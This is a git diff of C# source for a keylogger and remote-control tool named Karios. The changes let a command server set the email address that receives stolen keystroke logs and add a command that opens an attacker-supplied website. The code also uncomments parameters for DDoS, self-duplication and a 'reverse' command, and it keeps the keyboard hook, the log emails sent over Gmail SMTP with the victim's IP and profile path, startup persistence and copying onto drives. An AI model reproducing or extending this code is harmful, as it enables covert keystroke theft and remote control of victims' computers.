@@ -28,10 +28,10 @@ namespace Karios
         private static string _website;
         private static bool _online = false;
         public static string Commands = "";
+        public static string _emailEndpoint;
 
         public static void Main()
         {
-
             Console.WriteLine("Starting commandget");
             Console.ReadKey();
             CommandGet();
@@ -83,7 +83,7 @@ namespace Karios
 
                 var client = new WebClient();
 
-                var secret = "<3"; //A string to use as the version ID. Use it for testing the client.
+                //var secret = "<3"; //A string to use as the version ID. Use it for testing the client.
 
 
                 //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
@@ -119,7 +119,7 @@ namespace Karios
                         else
                             paramaters = paramaters + "&newclient=false";
                     }
-                    /*
+                    
                         // 1 = DDOSOnline
                         if (paramaters == "?")
                             paramaters = paramaters + "ddosonline=true";
@@ -168,12 +168,18 @@ namespace Karios
                         else
                             paramaters = paramaters + "&duplication=true";
 
-                        // 8 = Reverse
-                        if (paramaters == "?")
+                    // 8 = Website
+                    if (paramaters == "?")
+                        paramaters = paramaters + "website=true";
+                    else
+                        paramaters = paramaters + "&website=true";
+
+                    // 9 = Reverse
+                    if (paramaters == "?")
                             paramaters = paramaters + "reverse=false";
                         else
                             paramaters = paramaters + "&reverse=false";
-                        */
+                        
 
                     var commands = "";
                     try
@@ -194,7 +200,8 @@ namespace Karios
                     /// 5 = Capture screen
                     /// 6 = Startup
                     /// 7  = Duplication
-                    /// 8 = Reverse everything
+                    /// 8 = Website
+                    /// 9 = Reverses everything
                     /// </summary>
 #pragma warning restore 1587
 
@@ -206,10 +213,16 @@ namespace Karios
                     {
                         //Online = false;
                     }
+
+                    _emailEndpoint = preppedCommand[4];
+                    _website = preppedCommand[8];
                     loop = false;
                 }
             }
-            catch { }
+            catch
+            {
+                // ignored
+            }
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -253,7 +266,7 @@ namespace Karios
                 var mail = new MailMessage();
                 var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
-                mail.To.Add("GINGIRULES@gmail.com");
+                mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 Attachment attachment;
@@ -267,7 +280,10 @@ namespace Karios
                 attachment.Dispose();
                 //copy program to an new destination
             }
-            catch { }
+            catch
+            {
+                // ignored
+            }
 
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
             var alldrives = DriveInfo.GetDrives();
@@ -286,10 +302,11 @@ namespace Karios
             File.Delete(pathToLog);
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
+
+
         /// <summary>
         /// Sets the startup registary key
         /// </summary>
-
 
         public static void SetStartup()
         {
@@ -328,8 +345,7 @@ namespace Karios
                     return localIp;
                 }
                 finally
-                {
-                    //do something
+                {  
                 }
             }
         }
@@ -340,9 +356,12 @@ namespace Karios
             {
                 try
                 {
-
+                    Process.Start(_website);
                 }
-                catch { }
+                catch
+                {
+                    // ignored
+                }
             }
         }
 
@@ -355,7 +374,10 @@ namespace Karios
 
 
                 }
-                catch { }
+                catch
+                {
+                    // ignored
+                }
             }
         }
 
